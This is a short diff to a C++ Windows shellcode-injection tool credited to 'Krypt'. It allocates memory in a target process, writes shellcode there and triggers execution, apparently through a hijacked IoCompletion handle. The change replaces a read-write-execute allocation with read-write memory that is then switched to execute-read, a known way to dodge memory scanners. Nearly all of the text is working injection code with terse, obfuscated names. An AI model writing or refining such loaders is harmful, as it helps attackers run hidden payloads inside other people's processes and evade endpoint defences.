@@ -1,4 +1,5 @@
 // Made by Krypt :D
+// p1stn helped on additions
 #include <Windows.h>
 #include <thread>
 #include <iostream>
@@ -337,7 +338,7 @@ void p_p::run() {
         return;
     }
     h_h();
-    scA = VirtualAllocEx(tH, nullptr, scS, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    scA = VirtualAllocEx(tH, nullptr, scS, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!scA) {
         return;
     }
@@ -345,7 +346,10 @@ void p_p::run() {
     if (!nt_wvm(tH, scA, sc, scS, nullptr, &wst)) {
         return;
     }
+    DWORD oldP = 0;
+    VirtualProtectEx(tH, scA, scS, PAGE_EXECUTE_READ, &oldP);
     s_e();
+    VirtualProtectEx(tH, scA, scS, PAGE_EXECUTE_READWRITE, &oldP);
 }
 a_w::a_w(DWORD tP, unsigned char* sc, SIZE_T scS) : p_p(tP, sc, scS), iC(nullptr) {}
 void a_w::h_h() { iC = h_p_h(L"IoCompletion", tH, IO_COMPLETION_ALL_ACCESS); }
